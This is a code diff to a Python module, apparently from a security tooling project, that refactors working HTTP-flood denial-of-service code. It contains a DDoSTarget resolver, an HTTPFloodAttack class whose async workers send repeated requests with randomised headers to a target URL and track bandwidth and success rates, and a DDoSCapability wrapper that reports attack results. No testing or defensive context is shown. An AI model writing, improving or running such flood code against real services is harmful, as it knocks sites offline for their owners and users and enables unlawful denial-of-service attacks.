@@ -34,7 +34,47 @@ from rich.progress import Progress, SpinnerColumn, TextColumn
 from rich.prompt import Confirm
 from rich.table import Table
 
-from services.aiva_common.schemas import APIResponse
+from services.aiva_common.schemas.base import APIResponse
+
+# Base Capability 基礎類定義
+class BaseCapability:
+    """基礎能力類 - 所有模組能力的基礎類"""
+    
+    def __init__(self):
+        self.name = "base_capability"
+        self.version = "1.0.0"
+        self.description = "Base capability class"
+        self.dependencies = []
+    
+    def initialize(self) -> bool:
+        """初始化能力"""
+        return True
+    
+    async def execute(self, command: str, parameters: Dict[str, Any]) -> Dict[str, Any]:
+        """執行命令"""
+        raise NotImplementedError("Subclass must implement execute method")
+    
+    def cleanup(self) -> bool:
+        """清理資源"""
+        return True
+
+
+# Capability Registry 註冊中心
+class CapabilityRegistry:
+    """能力註冊中心"""
+    _capabilities = {}
+    
+    @classmethod
+    def register(cls, name: str, capability_class):
+        """註冊能力"""
+        cls._capabilities[name] = capability_class
+        logger.info(f"Registered capability: {name}")
+    
+    @classmethod
+    def get(cls, name: str):
+        """獲取能力"""
+        return cls._capabilities.get(name)
+
 
 console = Console()
 logger = logging.getLogger(__name__)
@@ -68,8 +108,12 @@ class DDoSTarget:
         if not self.ip:
             parsed = urlparse(self.url)
             try:
-                self.ip = socket.gethostbyname(parsed.hostname)
-            except socket.gaierror:
+                hostname = parsed.hostname
+                if hostname:
+                    self.ip = socket.gethostbyname(hostname)
+                else:
+                    self.ip = "127.0.0.1"
+            except (socket.gaierror, TypeError):
                 self.ip = "127.0.0.1"  # 默認值
             if not self.port or self.port == 80:
                 self.port = 443 if parsed.scheme == 'https' else 80
@@ -192,14 +236,29 @@ class HTTPFloodAttack:
         return result
     
     async def _attack_worker(self, progress: Progress, task_id):
-        """攻擊工作線程"""
+        """攻擊工作線程——降低複雜度"""
         request_count = 0
         start_time = time.time()
         
-        while self.attack_active and (time.time() - start_time) < self.target.duration:
-            try:
-                req_start = time.time()
+        while self._should_continue_attack(start_time):
+            success = await self._execute_single_request()
+            if success:
+                request_count += 1
                 
+            # 更新進度和速率控制
+            await self._handle_progress_and_rate_limit(request_count, start_time, progress, task_id)
+    
+    def _should_continue_attack(self, start_time: float) -> bool:
+        """判斷是否繼續攻擊"""
+        return (self.attack_active and 
+                (time.time() - start_time) < self.target.duration)
+    
+    async def _execute_single_request(self) -> bool:
+        """執行單一請求"""
+        try:
+            req_start = time.time()
+            
+            if self.session:
                 async with self.session.request(
                     self.target.method,
                     self.target.url,
@@ -208,34 +267,41 @@ class HTTPFloodAttack:
                 ) as response:
                     content = await response.read()
                     
-                    req_end = time.time()
-                    response_time = req_end - req_start
-                    
-                    # 記錄結果
-                    self.results['requests_sent'] += 1
-                    self.results['response_times'].append(response_time)
-                    self.results['bandwidth_used'] += len(content) if content else 1024
-                    
-                    if response.status < 400:
-                        self.results['successful_requests'] += 1
-                    else:
-                        self.results['failed_requests'] += 1
-                
-                request_count += 1
-                
-                # 更新進度
-                if request_count % 10 == 0:
-                    elapsed = time.time() - start_time
-                    progress.update(task_id, completed=elapsed)
-                
-                # 速率限制
-                if request_count % 100 == 0:
-                    await asyncio.sleep(0.01)
-                    
-            except Exception as e:
-                self.results['failed_requests'] += 1
-                logger.debug(f"請求失敗: {e}")
-                await asyncio.sleep(0.1)
+                    # 記錄請求結果
+                    self._record_request_result(req_start, response, content)
+                    return True
+        except Exception as e:
+            self.results['failed_requests'] += 1
+            logger.debug(f"請求失敗: {e}")
+            await asyncio.sleep(0.1)
+            return False
+        
+        return False
+    
+    def _record_request_result(self, req_start: float, response, content: bytes):
+        """記錄請求結果"""
+        req_end = time.time()
+        response_time = req_end - req_start
+        
+        self.results['requests_sent'] += 1
+        self.results['response_times'].append(response_time)
+        self.results['bandwidth_used'] += len(content) if content else 1024
+        
+        if response.status < 400:
+            self.results['successful_requests'] += 1
+        else:
+            self.results['failed_requests'] += 1
+    
+    async def _handle_progress_and_rate_limit(self, request_count: int, start_time: float, progress: Progress, task_id):
+        """處理進度更新和速率控制"""
+        # 更新進度
+        if request_count % 10 == 0:
+            elapsed = time.time() - start_time
+            progress.update(task_id, completed=elapsed)
+        
+        # 速率限制
+        if request_count % 100 == 0:
+            await asyncio.sleep(0.01)
     
     def _get_attack_headers(self) -> Dict[str, str]:
         """獲取攻擊請求頭"""
@@ -248,7 +314,8 @@ class HTTPFloodAttack:
             'Cache-Control': 'no-cache'
         }
         
-        base_headers.update(self.target.headers)
+        if self.target.headers:
+            base_headers.update(self.target.headers)
         return base_headers
     
     def _get_random_user_agent(self) -> str:
@@ -606,21 +673,31 @@ class DDoSCapability(BaseCapability):
                 response = APIResponse(
                     success=True,
                     message="DDoS attack report generated successfully",
-                    data={"report": report}
+                    data={"report": report},
+                    trace_id=None,
+                    errors=None,
+                    metadata=None
                 )
                 return response.model_dump()
             elif command == "show_statistics":
                 self.manager.show_attack_statistics()
                 response = APIResponse(
                     success=True,
-                    message="Attack statistics displayed successfully"
+                    message="Attack statistics displayed successfully",
+                    data=None,
+                    trace_id=None,
+                    errors=None,
+                    metadata=None
                 )
                 return response.model_dump()
             else:
                 response = APIResponse(
                     success=False,
                     message=f"Unknown command: {command}",
-                    errors=[f"Command '{command}' is not recognized"]
+                    data=None,
+                    trace_id=None,
+                    errors=[f"Command '{command}' is not recognized"],
+                    metadata=None
                 )
                 return response.model_dump()
             
